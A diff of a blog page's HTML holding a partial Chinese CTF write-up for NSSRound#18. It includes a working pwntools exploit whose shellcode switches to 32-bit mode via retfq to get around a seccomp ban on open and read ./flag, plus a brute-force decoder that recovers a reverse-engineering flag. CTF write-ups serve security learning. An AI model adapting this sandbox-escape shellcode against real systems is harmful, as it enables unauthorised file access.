+                                <i class="fa-regular fa-house fa-sm fa-fw"></i>
+                            
+                        </a>
+                        
+
+                        
+                    </li>
+            
+                
+                    
+
+                    <li class="drawer-navbar-item text-base my-1.5 flex flex-col w-full">
+                        
+                        <a class="py-1.5 px-2 flex flex-row items-center justify-between gap-1 hover:!text-primary active:!text-primary text-2xl font-semibold group border-b border-border-color hover:border-primary w-full "
+                           href="/archives/"
+                        >
+                            <span>
+                                归档
+                            </span>
+                            
+                                <i class="fa-regular fa-archive fa-sm fa-fw"></i>
+                            
+                        </a>
+                        
+
+                        
+                    </li>
+            
+                
+                    
+
+                    <li class="drawer-navbar-item text-base my-1.5 flex flex-col w-full">
+                        
+                        <a class="py-1.5 px-2 flex flex-row items-center justify-between gap-1 hover:!text-primary active:!text-primary text-2xl font-semibold group border-b border-border-color hover:border-primary w-full "
+                           href="/categories/"
+                        >
+                            <span>
+                                分类
+                            </span>
+                            
+                                <i class="fa-regular fa-folder fa-sm fa-fw"></i>
+                            
+                        </a>
+                        
+
+                        
+                    </li>
+            
+                
+                    
+
+                    <li class="drawer-navbar-item text-base my-1.5 flex flex-col w-full">
+                        
+                        <a class="py-1.5 px-2 flex flex-row items-center justify-between gap-1 hover:!text-primary active:!text-primary text-2xl font-semibold group border-b border-border-color hover:border-primary w-full "
+                           href="/tags/"
+                        >
+                            <span>
+                                标签
+                            </span>
+                            
+                                <i class="fa-regular fa-tags fa-sm fa-fw"></i>
+                            
+                        </a>
+                        
+
+                        
+                    </li>
+            
+                
+                    
+
+                    <li class="drawer-navbar-item text-base my-1.5 flex flex-col w-full">
+                        
+                        <a class="py-1.5 px-2 flex flex-row items-center justify-between gap-1 hover:!text-primary active:!text-primary text-2xl font-semibold group border-b border-border-color hover:border-primary w-full "
+                           href="/about/"
+                        >
+                            <span>
+                                关于
+                            </span>
+                            
+                                <i class="fa-regular fa-user fa-sm fa-fw"></i>
+                            
+                        </a>
+                        
+
+                        
+                    </li>
+            
+                
+                    
+
+                    <li class="drawer-navbar-item text-base my-1.5 flex flex-col w-full">
+                        
+                        <a class="py-1.5 px-2 flex flex-row items-center justify-between gap-1 hover:!text-primary active:!text-primary text-2xl font-semibold group border-b border-border-color hover:border-primary w-full "
+                           href="/links/"
+                        >
+                            <span>
+                                友情链接
+                            </span>
+                            
+                                <i class="fa-solid fa-link fa-sm fa-fw"></i>
+                            
+                        </a>
+                        
+
+                        
+                    </li>
+            
+
+            
+            
+        </ul>
+
+        <div class="statistics flex justify-around my-2.5">
+    <a class="item tag-count-item flex flex-col justify-center items-center w-20" href="/tags">
+        <div class="number text-2xl sm:text-xl text-second-text-color font-semibold">51</div>
+        <div class="label text-third-text-color text-sm">标签</div>
+    </a>
+    <a class="item tag-count-item flex flex-col justify-center items-center w-20" href="/categories">
+        <div class="number text-2xl sm:text-xl text-second-text-color font-semibold">5</div>
+        <div class="label text-third-text-color text-sm">分类</div>
+    </a>
+    <a class="item tag-count-item flex flex-col justify-center items-center w-20" href="/archives">
+        <div class="number text-2xl sm:text-xl text-second-text-color font-semibold">79</div>
+        <div class="label text-third-text-color text-sm">文章</div>
+    </a>
+</div>
+    </div>
+
+    <div class="window-mask"></div>
+
+</header>
+
+
+		</div>
+
+		<div class="main-content-body transition-fade-up">
+			
+
+			<div class="main-content">
+				<div class="post-page-container flex relative justify-between box-border w-full h-full">
+	<div class="article-content-container">
+
+		<div class="article-title relative w-full">
+			
+			<div class="w-full flex items-center pt-6 justify-start">
+				<h1 class="article-title-regular text-second-text-color tracking-tight text-4xl md:text-6xl font-semibold px-2 sm:px-6 md:px-8 py-3">NSSRound#18部分wp</h1>
+			</div>
+			
+		</div>
+
+		
+		<div class="article-header flex flex-row gap-2 items-center px-2 sm:px-6 md:px-8">
+			<div class="avatar w-[46px] h-[46px] shrink-0 rounded-medium border border-border-color p-px">
+				<img src="/img/China.jpg">
+			</div>
+			<div class="info flex flex-col justify-between">
+				<div class="author flex items-center">
+					<span class="name text-default-text-color text-lg font-semibold">j1ya</span>
+					
+					<span class="author-label ml-1.5 text-xs px-2 py-0.5 rounded-small text-third-text-color border border-shadow-color-1">Lv5</span>
+					
+				</div>
+				<div class="meta-info">
+					<div class="article-meta-info">
+    <span class="article-date article-meta-item">
+        <i class="fa-regular fa-pen-fancy"></i>&nbsp;
+        <span class="desktop">2024-02-16 19:42:42</span>
+        <span class="mobile">2024-02-16 19:42:42</span>
+        <span class="hover-info">创建</span>
+    </span>
+    
+        <span class="article-date article-meta-item">
+            <i class="fa-regular fa-wrench"></i>&nbsp;
+            <span class="desktop">2026-01-09 11:06:28</span>
+            <span class="mobile">2026-01-09 11:06:28</span>
+            <span class="hover-info">更新</span>
+        </span>
+    
+
+    
+        <span class="article-categories article-meta-item">
+            <i class="fa-regular fa-folders"></i>&nbsp;
+            <ul>
+                
+                
+                    
+                        
+                        <li>
+                            <a href="/categories/%E6%AF%94%E8%B5%9Bwp/">比赛wp</a>&nbsp;
+                        </li>
+                    
+                    
+                
+            </ul>
+        </span>
+    
+    
+        <span class="article-tags article-meta-item">
+            <i class="fa-regular fa-tags"></i>&nbsp;
+            <ul>
+                
+                    <li>
+                        <a href="/tags/unity%E9%80%86%E5%90%91/">unity逆向</a>&nbsp;
+                    </li>
+                
+                    <li>
+                        | <a href="/tags/VM/">VM</a>&nbsp;
+                    </li>
+                
+                    <li>
+                        | <a href="/tags/shellcode/">shellcode</a>&nbsp;
+                    </li>
+                
+            </ul>
+        </span>
+    
+
+    
+    
+    
+    
+        <span class="article-pv article-meta-item">
+            <i class="fa-regular fa-eye"></i>&nbsp;<span id="busuanzi_value_page_pv"></span>
+        </span>
+    
+</div>
+
+				</div>
+			</div>
+		</div>
+		
+
+		
+
+
+		<div class="article-content markdown-body px-2 sm:px-6 md:px-8 pb-8">
+			<h1 id="pwn"><a href="#pwn" class="headerlink" title="pwn"></a>pwn</h1><h2 id="HappyCTF"><a href="#HappyCTF" class="headerlink" title="HappyCTF"></a>HappyCTF</h2><p>看到rwx基本上是shellcode</p>
+<img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/2024/02/16/NSSRound18%E9%83%A8%E5%88%86wp/1707882413729-a8b684db-8573-447e-a278-5447c939771a-170808409444444.png"
+                      class="" title="img"
+                >
+
+<img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/2024/02/16/NSSRound18%E9%83%A8%E5%88%86wp/1707882320571-ffb866fd-3a4b-4970-9dd8-2565512afce9-170808409444446.png"
+                      class="" title="img"
+                >
 
 <p>vuln函数反编译不了，问题不大</p>
-<img src="/2024/02/16/NSSRound18%E9%83%A8%E5%88%86wp/1707879608622-3f721439-e2cf-4a39-a7a5-7452e147cf52-170808409444448.png" srcset="/img/loading.gif" lazyload class="" title="img">
+<img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/2024/02/16/NSSRound18%E9%83%A8%E5%88%86wp/1707879608622-3f721439-e2cf-4a39-a7a5-7452e147cf52-170808409444448.png"
+                      class="" title="img"
+                >
 
 <p>敲，后面发现把open给禁了，那得用retfq和retf了</p>
-<img src="/2024/02/16/NSSRound18%E9%83%A8%E5%88%86wp/1708081299573-447e5ca9-254f-4562-87cd-130c5e595733.png" srcset="/img/loading.gif" lazyload class="" title="img">
+<img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/2024/02/16/NSSRound18%E9%83%A8%E5%88%86wp/1708081299573-447e5ca9-254f-4562-87cd-130c5e595733.png"
+                      class="" title="img"
+                >
 
-<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><br>context(os=<span class="hljs-string">&#x27;linux&#x27;</span>,log_level=<span class="hljs-string">&#x27;debug&#x27;</span>)<br><br><span class="hljs-comment">#p = remote(&quot;node1.anna.nssctf.cn&quot;,28592)</span><br>p = process(<span class="hljs-string">&quot;./HappyCTF&quot;</span>)<br>elf = ELF(<span class="hljs-string">&quot;./HappyCTF&quot;</span>)<br><br>libc = ELF(<span class="hljs-string">&quot;./libc.so.6&quot;</span>)<br><span class="hljs-comment">#context(arch=&quot;amd64&quot;,os=&quot;linux&quot;,log_level=&quot;debug&quot;)</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">s</span>(<span class="hljs-params">a</span>) : p.send(a)<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">sa</span>(<span class="hljs-params">a, b</span>) : p.sendafter(a, b)<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">sl</span>(<span class="hljs-params">a</span>) : p.sendline(a)<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">sla</span>(<span class="hljs-params">a, b</span>) : p.sendlineafter(a, b)<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">r</span>() : <span class="hljs-keyword">return</span> p.recv()<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">pr</span>() : <span class="hljs-built_in">print</span>(p.recv())<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">rl</span>(<span class="hljs-params">a</span>) : <span class="hljs-keyword">return</span> p.recvuntil(a)<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">inter</span>() : p.interactive()<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">get_addr</span>():<br>	<span class="hljs-keyword">return</span> u64(p.recvuntil(<span class="hljs-string">b&#x27;\x7f&#x27;</span>)[-<span class="hljs-number">6</span>:].ljust(<span class="hljs-number">8</span>, <span class="hljs-string">b&#x27;\x00&#x27;</span>))<br><br><br><span class="hljs-comment">#gdb.attach(p,&#x27;b *0x4013a0&#x27;)</span><br>sh = asm(<span class="hljs-string">&#x27;&#x27;&#x27;</span><br><span class="hljs-string">push 0x40404040 /*set rdi*/</span><br><span class="hljs-string">pop rdi</span><br><span class="hljs-string"></span><br><span class="hljs-string">push 0x7e /*set rsi*/</span><br><span class="hljs-string">pop rsi</span><br><span class="hljs-string"></span><br><span class="hljs-string">push 9 /*set rdx*/</span><br><span class="hljs-string">pop rax</span><br><span class="hljs-string"></span><br><span class="hljs-string">push 7</span><br><span class="hljs-string">pop rdx</span><br><span class="hljs-string">push 34</span><br><span class="hljs-string">pop r10</span><br><span class="hljs-string">xor r9,r9</span><br><span class="hljs-string">xor r8,r8</span><br><span class="hljs-string">syscall</span><br><span class="hljs-string">/read/</span><br><span class="hljs-string">xor rax,rax</span><br><span class="hljs-string">xor rdi,rdi</span><br><span class="hljs-string">push 0x40404040</span><br><span class="hljs-string">pop rsi</span><br><span class="hljs-string">push 200</span><br><span class="hljs-string">pop rdx</span><br><span class="hljs-string">syscall</span><br><span class="hljs-string"></span><br><span class="hljs-string">push 0x23</span><br><span class="hljs-string">push rsi</span><br><span class="hljs-string">retfq</span><br><span class="hljs-string">&#x27;&#x27;&#x27;</span>,arch = <span class="hljs-string">&#x27;amd64&#x27;</span>)<br>sd = asm(<span class="hljs-string">&#x27;&#x27;&#x27;</span><br><span class="hljs-string">mov esp,0x40404040</span><br><span class="hljs-string">mov eax,5</span><br><span class="hljs-string">push 0x00006761</span><br><span class="hljs-string">push 0x6c662f2e</span><br><span class="hljs-string">mov ebx,esp</span><br><span class="hljs-string">xor ecx,ecx</span><br><span class="hljs-string">int 0x80</span><br><span class="hljs-string">push 0x33</span><br><span class="hljs-string">push 0x40404062</span><br><span class="hljs-string">retf</span><br><span class="hljs-string">&#x27;&#x27;&#x27;</span>,arch = <span class="hljs-string">&#x27;i386&#x27;</span>)<br>sf = asm(<span class="hljs-string">&#x27;&#x27;&#x27;</span><br><span class="hljs-string">mov rax,0</span><br><span class="hljs-string">mov rdi,3</span><br><span class="hljs-string">mov rsi,0x40404128</span><br><span class="hljs-string">mov rdx,0x30</span><br><span class="hljs-string">syscall</span><br><span class="hljs-string">mov rax,1</span><br><span class="hljs-string">mov rdi,1</span><br><span class="hljs-string">mov rsi,0x40404128</span><br><span class="hljs-string">mov rdx,0x30</span><br><span class="hljs-string">syscall</span><br><span class="hljs-string">&#x27;&#x27;&#x27;</span>,arch=<span class="hljs-string">&#x27;amd64&#x27;</span>)<br>sa(<span class="hljs-string">&quot;:&quot;</span>,sh)<br>pause()<br>sl(sd+sf)<br><br>p.interactive()<br></code></pre></td></tr></table></figure>
+<div class="code-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">context(os=<span class="string">&#x27;linux&#x27;</span>,log_level=<span class="string">&#x27;debug&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">#p = remote(&quot;node1.anna.nssctf.cn&quot;,28592)</span></span><br><span class="line">p = process(<span class="string">&quot;./HappyCTF&quot;</span>)</span><br><span class="line">elf = ELF(<span class="string">&quot;./HappyCTF&quot;</span>)</span><br><span class="line"></span><br><span class="line">libc = ELF(<span class="string">&quot;./libc.so.6&quot;</span>)</span><br><span class="line"><span class="comment">#context(arch=&quot;amd64&quot;,os=&quot;linux&quot;,log_level=&quot;debug&quot;)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">s</span>(<span class="params">a</span>) : p.send(a)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">sa</span>(<span class="params">a, b</span>) : p.sendafter(a, b)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">sl</span>(<span class="params">a</span>) : p.sendline(a)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">sla</span>(<span class="params">a, b</span>) : p.sendlineafter(a, b)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">r</span>() : <span class="keyword">return</span> p.recv()</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">pr</span>() : <span class="built_in">print</span>(p.recv())</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">rl</span>(<span class="params">a</span>) : <span class="keyword">return</span> p.recvuntil(a)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">inter</span>() : p.interactive()</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">get_addr</span>():</span><br><span class="line">	<span class="keyword">return</span> u64(p.recvuntil(<span class="string">b&#x27;\x7f&#x27;</span>)[-<span class="number">6</span>:].ljust(<span class="number">8</span>, <span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">#gdb.attach(p,&#x27;b *0x4013a0&#x27;)</span></span><br><span class="line">sh = asm(<span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">push 0x40404040 /*set rdi*/</span></span><br><span class="line"><span class="string">pop rdi</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">push 0x7e /*set rsi*/</span></span><br><span class="line"><span class="string">pop rsi</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">push 9 /*set rdx*/</span></span><br><span class="line"><span class="string">pop rax</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">push 7</span></span><br><span class="line"><span class="string">pop rdx</span></span><br><span class="line"><span class="string">push 34</span></span><br><span class="line"><span class="string">pop r10</span></span><br><span class="line"><span class="string">xor r9,r9</span></span><br><span class="line"><span class="string">xor r8,r8</span></span><br><span class="line"><span class="string">syscall</span></span><br><span class="line"><span class="string">/read/</span></span><br><span class="line"><span class="string">xor rax,rax</span></span><br><span class="line"><span class="string">xor rdi,rdi</span></span><br><span class="line"><span class="string">push 0x40404040</span></span><br><span class="line"><span class="string">pop rsi</span></span><br><span class="line"><span class="string">push 200</span></span><br><span class="line"><span class="string">pop rdx</span></span><br><span class="line"><span class="string">syscall</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">push 0x23</span></span><br><span class="line"><span class="string">push rsi</span></span><br><span class="line"><span class="string">retfq</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span>,arch = <span class="string">&#x27;amd64&#x27;</span>)</span><br><span class="line">sd = asm(<span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">mov esp,0x40404040</span></span><br><span class="line"><span class="string">mov eax,5</span></span><br><span class="line"><span class="string">push 0x00006761</span></span><br><span class="line"><span class="string">push 0x6c662f2e</span></span><br><span class="line"><span class="string">mov ebx,esp</span></span><br><span class="line"><span class="string">xor ecx,ecx</span></span><br><span class="line"><span class="string">int 0x80</span></span><br><span class="line"><span class="string">push 0x33</span></span><br><span class="line"><span class="string">push 0x40404062</span></span><br><span class="line"><span class="string">retf</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span>,arch = <span class="string">&#x27;i386&#x27;</span>)</span><br><span class="line">sf = asm(<span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">mov rax,0</span></span><br><span class="line"><span class="string">mov rdi,3</span></span><br><span class="line"><span class="string">mov rsi,0x40404128</span></span><br><span class="line"><span class="string">mov rdx,0x30</span></span><br><span class="line"><span class="string">syscall</span></span><br><span class="line"><span class="string">mov rax,1</span></span><br><span class="line"><span class="string">mov rdi,1</span></span><br><span class="line"><span class="string">mov rsi,0x40404128</span></span><br><span class="line"><span class="string">mov rdx,0x30</span></span><br><span class="line"><span class="string">syscall</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span>,arch=<span class="string">&#x27;amd64&#x27;</span>)</span><br><span class="line">sa(<span class="string">&quot;:&quot;</span>,sh)</span><br><span class="line">pause()</span><br><span class="line">sl(sd+sf)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure></div>
 
 
 
 <h1 id="re"><a href="#re" class="headerlink" title="re"></a>re</h1><h2 id="编码"><a href="#编码" class="headerlink" title="编码"></a>编码</h2><p>直接密文去解密不对</p>
-<img src="/2024/02/16/NSSRound18%E9%83%A8%E5%88%86wp/1707896480014-6513872d-2a7a-4f57-a6b7-27fe2aa5a271.png" srcset="/img/loading.gif" lazyload class="" title="img">
+<img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/2024/02/16/NSSRound18%E9%83%A8%E5%88%86wp/1707896480014-6513872d-2a7a-4f57-a6b7-27fe2aa5a271.png"
+                      class="" title="img"
+                >
 
 <p>有tls也绕过了（tls不一定能够用上）</p>
-<img src="/2024/02/16/NSSRound18%E9%83%A8%E5%88%86wp/1707896510027-81ff0497-65d7-4ea5-9c79-fd25036fd396.png" srcset="/img/loading.gif" lazyload class="" title="img">
+<img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/2024/02/16/NSSRound18%E9%83%A8%E5%88%86wp/1707896510027-81ff0497-65d7-4ea5-9c79-fd25036fd396.png"
+                      class="" title="img"
+                >
 
 <p>也没看出有其他的算法</p>
 <p>这种一般都是自己设计的算法，要静下心来看</p>
 <p>发现先十进制转二进制</p>
-<img src="/2024/02/16/NSSRound18%E9%83%A8%E5%88%86wp/1708050502254-af67ad5d-02e9-4c98-9e25-8a52fa81bd84.png" srcset="/img/loading.gif" lazyload class="" title="img">
+<img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/2024/02/16/NSSRound18%E9%83%A8%E5%88%86wp/1708050502254-af67ad5d-02e9-4c98-9e25-8a52fa81bd84.png"
+                      class="" title="img"
+                >
 
 <p>经过rc4初始化算法</p>
-<img src="/2024/02/16/NSSRound18%E9%83%A8%E5%88%86wp/1708050549029-968a083a-1240-484f-b9f2-b86796fdb424.png" srcset="/img/loading.gif" lazyload class="" title="img">
+<img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/2024/02/16/NSSRound18%E9%83%A8%E5%88%86wp/1708050549029-968a083a-1240-484f-b9f2-b86796fdb424.png"
+                      class="" title="img"
+                >
 
 <p>再把二进制转化为十进制作为下标去找对应的值，类似于base64</p>
 <p>这种要通过爆破，首先找密文在table里的下标</p>
-<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><code class="hljs python">table = [<br>    <span class="hljs-number">0xC0</span>, <span class="hljs-number">0xC1</span>, <span class="hljs-number">0xC2</span>, <span class="hljs-number">0xC3</span>, <span class="hljs-number">0xC4</span>, <span class="hljs-number">0xC5</span>, <span class="hljs-number">0xC6</span>, <span class="hljs-number">0xC7</span>, <span class="hljs-number">0xC8</span>, <span class="hljs-number">0xC9</span>,<br>    <span class="hljs-number">0xCA</span>, <span class="hljs-number">0xCB</span>, <span class="hljs-number">0xCC</span>, <span class="hljs-number">0xCD</span>, <span class="hljs-number">0xCE</span>, <span class="hljs-number">0xCF</span>, <span class="hljs-number">0xD0</span>, <span class="hljs-number">0xD1</span>, <span class="hljs-number">0xD2</span>, <span class="hljs-number">0xD3</span>,<br>    <span class="hljs-number">0xD4</span>, <span class="hljs-number">0xD5</span>, <span class="hljs-number">0xD6</span>, <span class="hljs-number">0xD7</span>, <span class="hljs-number">0xD8</span>, <span class="hljs-number">0xD9</span>, <span class="hljs-number">0xE0</span>, <span class="hljs-number">0xE1</span>, <span class="hljs-number">0xE2</span>, <span class="hljs-number">0xE3</span>,<br>    <span class="hljs-number">0xE4</span>, <span class="hljs-number">0xE5</span>, <span class="hljs-number">0xE6</span>, <span class="hljs-number">0xE7</span>, <span class="hljs-number">0xE8</span>, <span class="hljs-number">0xE9</span>, <span class="hljs-number">0xEA</span>, <span class="hljs-number">0xEB</span>, <span class="hljs-number">0xEC</span>, <span class="hljs-number">0xED</span>,<br>    <span class="hljs-number">0xEE</span>, <span class="hljs-number">0xEF</span>, <span class="hljs-number">0xF0</span>, <span class="hljs-number">0xF1</span>, <span class="hljs-number">0xF2</span>, <span class="hljs-number">0xF3</span>, <span class="hljs-number">0xF4</span>, <span class="hljs-number">0xF5</span>, <span class="hljs-number">0xF6</span>, <span class="hljs-number">0xF7</span>,<br>    <span class="hljs-number">0xF8</span>, <span class="hljs-number">0xF9</span>, <span class="hljs-number">0xAF</span>, <span class="hljs-number">0xB0</span>, <span class="hljs-number">0xB1</span>, <span class="hljs-number">0xB2</span>, <span class="hljs-number">0xB3</span>, <span class="hljs-number">0xB4</span>, <span class="hljs-number">0xB5</span>, <span class="hljs-number">0xB6</span>,<br>    <span class="hljs-number">0xB7</span>, <span class="hljs-number">0xB8</span>, <span class="hljs-number">0xAA</span>, <span class="hljs-number">0xAE</span><br>]<br><br>enc = <span class="hljs-built_in">bytearray</span>.fromhex(<span class="hljs-string">&quot;E2F7D3E2C8B4D8C5CFB4E7EEE1D9F1EFCBEBD9C9CEC5D9E5CCB7D1EDE0B4F1EEE0E7D2F6CBF3C9F3D3D5EF&quot;</span>)<br><span class="hljs-built_in">print</span>(enc)<br>idx = []<br><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> enc:<br>    idx.append(table.index(i))<span class="hljs-comment">#遍历字节数组enc中的每个元素，使用table.index(i)方法找到该元素在table列表中的索引</span><br><br>s = []<br><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> idx:<br>    s.append(<span class="hljs-built_in">bin</span>(i)[<span class="hljs-number">2</span>:].zfill(<span class="hljs-number">6</span>))<span class="hljs-comment">#zfill左侧填充</span><br><br>res = <span class="hljs-string">&quot;&quot;</span><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> s:<br>    <span class="hljs-keyword">for</span> j <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">0</span>, <span class="hljs-number">0b111111</span>):<br>        c = <span class="hljs-built_in">list</span>(<span class="hljs-built_in">bin</span>(j)[<span class="hljs-number">2</span>:].zfill(<span class="hljs-number">6</span>))<br>        l = <span class="hljs-number">0</span><br>        r = <span class="hljs-number">0</span><br>        <span class="hljs-keyword">for</span> k <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">0</span>, <span class="hljs-number">256</span>,<span class="hljs-number">2</span>):<span class="hljs-comment">#i=v3+1=i+1+1</span><br>            l = (k + <span class="hljs-number">1</span>) % <span class="hljs-number">256</span><br>            r = (l + r + <span class="hljs-number">1</span>) % <span class="hljs-number">256</span><br>            c[l % <span class="hljs-number">6</span>], c[r % <span class="hljs-number">6</span>] = c[r % <span class="hljs-number">6</span>], c[l % <span class="hljs-number">6</span>]<br>        d = <span class="hljs-string">&quot;&quot;</span>.join(c)<br>        <span class="hljs-keyword">if</span> d == i:<br>            res += <span class="hljs-built_in">bin</span>(j)[<span class="hljs-number">2</span>:].zfill(<span class="hljs-number">6</span>)<br>            <span class="hljs-keyword">break</span><br><br>b = [res[i:i+<span class="hljs-number">8</span>] <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">0</span>, <span class="hljs-built_in">len</span>(res), <span class="hljs-number">8</span>)]<br><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> b:<br>    <span class="hljs-built_in">print</span>(<span class="hljs-built_in">chr</span>(<span class="hljs-built_in">int</span>(i, <span class="hljs-number">2</span>)), end=<span class="hljs-string">&quot;&quot;</span>)<br><br><span class="hljs-comment">#NSSCTF&#123;Y0u_4reThe_K1ng_0fBase64&#125;</span><br></code></pre></td></tr></table></figure>
